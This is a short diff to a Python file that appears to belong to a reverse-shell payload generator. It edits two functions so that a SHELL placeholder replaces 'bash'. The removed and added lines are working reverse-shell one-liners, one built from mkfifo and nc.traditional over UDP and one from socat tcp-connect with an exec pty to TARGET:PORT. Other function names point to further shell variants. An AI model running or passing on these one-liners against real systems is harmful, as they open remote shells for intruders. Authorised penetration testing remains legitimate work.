@@ -52,7 +52,7 @@ def REVERSE_NC_TRADITIONAL_1():
 
 
 def REVERSE_NC_UDP_1():
-    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { bash -i; } > fifo"""
+    return """mkfifo fifo ; nc.traditional -u TARGET PORT < fifo | { SHELL -i; } > fifo"""
 
 
 def REVERSE_MKFIFO_NC():
@@ -72,7 +72,7 @@ def REVERSE_MKNOD_TELNET():
 
 
 def REVERSE_SOCAT():
-    return """socat tcp-connect:TARGET:PORT exec:"bash -li",pty,stderr,setsid,sigint,sane"""
+    return """socat tcp-connect:TARGET:PORT exec:"SHELL -li",pty,stderr,setsid,sigint,sane"""
 
 
 def REVERSE_AWK():
